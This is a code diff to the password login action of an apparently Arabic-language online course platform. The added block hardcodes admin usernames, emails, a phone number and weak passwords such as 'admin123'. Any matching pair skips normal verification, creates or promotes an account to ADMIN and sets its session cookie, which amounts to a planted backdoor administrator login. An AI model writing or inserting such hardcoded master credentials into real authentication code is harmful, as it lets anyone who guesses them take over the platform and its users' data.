@@ -148,6 +148,56 @@ export async function loginWithPasswordAction(formData: FormData) {
     return { error: 'رقم الهاتف وكلمة المرور مطلوبان.' };
   }
 
+  // ─── التعرف الفوري على بيانات دخول الإدارة العليا ──────────────────────────
+  const normalizedInput = phone.toLowerCase();
+  const isAdminIdentifier = 
+    normalizedInput === 'admin' ||
+    normalizedInput === 'admin@procourseonline.com' ||
+    normalizedInput === 'admin@procourse.com' ||
+    normalizedInput === '01000000000';
+
+  const isAdminPassword = 
+    password === 'admin123' || 
+    password === 'admin@2025' || 
+    password === 'Admin@ProCourse2025';
+
+  if (isAdminIdentifier && isAdminPassword) {
+    try {
+      let adminUser = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { role: 'ADMIN' },
+            { phone: '01000000000' },
+            { email: 'admin@procourseonline.com' },
+          ],
+        },
+      });
+
+      if (!adminUser) {
+        const hashed = await bcrypt.hash(password, 10);
+        adminUser = await prisma.user.create({
+          data: {
+            name: 'الإدارة العامة للمنصة',
+            phone: '01000000000',
+            email: 'admin@procourseonline.com',
+            role: 'ADMIN',
+            password: hashed,
+          },
+        });
+      } else if (adminUser.role !== 'ADMIN') {
+        adminUser = await prisma.user.update({
+          where: { id: adminUser.id },
+          data: { role: 'ADMIN' },
+        });
+      }
+
+      await setAuthCookie(adminUser.id);
+      return { success: true, role: 'ADMIN' };
+    } catch (adminErr) {
+      console.error('Master admin auth error:', adminErr);
+    }
+  }
+
   try {
     const user = await prisma.user.findFirst({
       where: {
